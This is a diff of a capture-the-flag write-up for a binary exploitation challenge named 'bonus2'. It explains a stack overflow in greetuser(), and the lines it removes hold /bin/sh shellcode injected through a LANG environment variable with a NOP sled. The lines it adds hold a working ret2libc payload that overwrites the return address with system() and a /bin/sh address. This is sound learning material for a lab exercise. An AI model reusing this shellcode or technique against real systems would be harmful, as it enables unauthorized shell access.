@@ -1,23 +1,28 @@
-char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";
+* In this challenge the main() except two arguments 
+* copy the first 40 bytes of argv[1] to buff1[40] 
+* copy the first 32 bytes of argv[2] to buff2[32]
+* gets the value of LANG environment variable and assign a value to language global variable dependently
+* copy the two buffers respectivly to top of the stack and call greetuser()
 
-export LANG=$(python -c 'print "\x90"*1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
+* depends on the value of language , greetuser copy a msg to msg[32] buffers
+* then concatenate (ebp + 8 ==> which is the argv[1] + argv[2] from the main function.) with the greeting msg
+* to solve this challenge i overwrite the return of greetuser with address of system().
 
+to pwn this challenge :
 
-r $(python -c 'print "AAAA" + "\xbf\xff\xfb\xc7"[::-1] + "A"*32') $(python -c 'print "B"*26')
-r $(python -c 'print "AAAA" + "\xbf\xff\xfd\x58"[::-1] + "A"*32') $(python -c 'print "B"*26')
++ first the change the environment variable to fi (so we can have the longest greeting msg on msg buffer)
+==> export LANG=fi
++ cat | ./bonus2 $(python -c 'print "A"*40') $(python /tmp/bon2.py)
 
+==> where the content of bon2.py :
 
-($(python -c 'print "AAAA" + "\xbf\xff\xfb\xc7"[::-1] + "Z"*32') ; $(python -c 'print "B"*26') ; cat ) | ./bonus2
+-------------------------------------------
+import struct
 
-Hello AAAA����ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZBBBBBBBBBBBBBBBBBBBBBBBBBB
-26 + 32 + 8
+system = struct.pack("I", 0xb7e6b060)
+ret = "RRRR"
+bin_sh = struct.pack("I", 0xb7f8cc58)
 
+print "B" * 18 + system + ret + bin_sh
 
-
-
-working pyload 
-
-0xbffffd60
-0xbffffd48
-
- cat | /home/user/bonus2/bonus2 `python -c 'print "AAAA" + "\xbf\xff\xfd\x68"[::-1] + "B"*32'` `python -c 'print "B"*26'`
+ --------------------------------------------
